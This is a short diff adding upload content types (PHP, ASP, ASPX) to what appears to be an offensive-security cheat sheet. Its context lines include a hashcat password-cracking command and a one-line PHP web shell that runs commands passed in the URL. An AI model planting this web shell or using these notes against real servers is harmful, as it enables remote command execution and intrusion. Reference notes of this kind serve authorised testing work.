@@ -158,6 +158,11 @@ cd /mnt/c/hashcat; hashcat.exe -m 19700 hashes $(wslpath -w $rockyou)
 # Foothold: Protocols and Services
 ## Web
 [*] Web Shell
+[###] Content Types
+application/x-httpd-php
+application/x-asp
+application/x-aspx
+
 [###] PHP
 echo -n '<?=`$_GET[cmd]`?>' | tee /Upload/shells/x.php
 
